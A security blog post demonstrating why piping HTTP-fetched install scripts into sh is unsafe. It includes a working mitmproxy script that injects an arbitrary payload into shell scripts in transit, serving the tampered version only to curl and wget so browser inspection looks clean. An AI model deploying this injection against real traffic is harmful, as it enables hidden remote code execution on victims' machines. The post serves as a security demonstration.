---
layout: post
title:  'Owning "curl | sh" for Fun and Profit'
categories: [security]
---



If you're a web developer, you've probably seen sites asking you to install their software package like so:

```
curl -s http://example.com/install.sh | sh
```


There are a number of subtle problems with piping a HTTP response into the shell (for example, if your connection is
interrupted part-way through the script, the script may end up partially executed, 
[as written about here](https://www.seancassidy.me/dont-pipe-to-your-shell.html)),
but let's look at the most obvious problem: the ease with which a man-in-the-middle can modify code you are about to
directly execute.

Users piping unencrypted web traffic into the shell is about as easy it gets for me as an attacker, because:
- shell scripts are easily identified as such, and so are easy to target
- shell scripts are written in plaintext, so it's straightforward to inject our own code into it
- if they look at it at all, users are likely to inspect the code with a separate tool than they use to download and
  execute it (the browser versus curl or wget), and I can conditionally respond to this.

I wrote a proof-of-concept script, using [mitmproxy](https://mitmproxy.org/index.html), that can detect scripts
downloaded using this pattern and inject shell commands of my choosing.

Let's write a simple [mitmproxy script](https://mitmproxy.org/doc/scripting/inlinescripts.html) to do this.

{% highlight python %}
#!/usr/bin/python

from libmproxy.protocol.http import decoded


def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "inject_shell.py payload.sh"')
    context.payload = get_payload(argv[1])
    

def get_payload(payload_file):
    """
    Read and return the payload file as a string
    """
    f = open(payload_file, 'r')
    lines = f.readlines()
    f.close()
    return '\n'.join(lines)
    
def is_shell_script(resp):
    """
    Returns true if the request is a possible shell script
    """
    shell_content_type = False
    content_type = resp.headers.get_first("content-type", "")
    # if content-type is set, should be text/*
    if content_type != "" and not content_type.startswith('text/'):
        return False
    # and should start with shebang
    if not resp.content.startswith('#!'):
        return False
    return True

def response(context, flow):
    resp = flow.response
    req = flow.request
    with decoded(resp):
        if is_shell_script(resp):
            flow.response.content = flow.response.content.replace(
                '\n',
                '\n' + context.payload + '\n',
                1)
{% endhighlight %}

When a request is made through mitmproxy, this will modify any response that looks like a shell script to contain our
payload. Let's modify this so we only add the payload if the file is downloaded via curl or wget, so that a user
inspecting the code in the browser doesn't see what we've injected:
 
{% highlight python %}
def is_cli_tool(req):
    """
    Returns true if the user-agent looks like curl or wget
    """
    user_agent = req.headers.get_first("User-Agent", "")
    if user_agent.startswith('curl'):
        return True
    if user_agent.startswith('Wget'):
        return True
    return False
def response(context, flow):
  # ...
  with decoded(resp):
      if is_shell_script(resp) and is_cli_tool(req):
      # ...
{% endhighlight %}


To test it out, run mitmproxy with this script in [regular](http://mitmproxy.org/doc/modes.html) mode:


```
mitmproxy -s "inject_shell.py payload.sh
```

Configure your browser to proxy HTTP connections through `localhost:8080`, and take a look at a shell script over HTTP
([like any of the http:// links here](https://www.google.com/webhp?q=filetype:sh+inurl:http)). Looks fine, right?

Now try it via curl:

```
curl -x localhost:8080 http://example.com/install.sh
```

You should now see the payload injected into the response. Same with wget: 

```
wget -qO- http://example.com/install.sh
```

Security is fun. [Source is up on github here](https://github.com/chrishepner/sh-mitm). 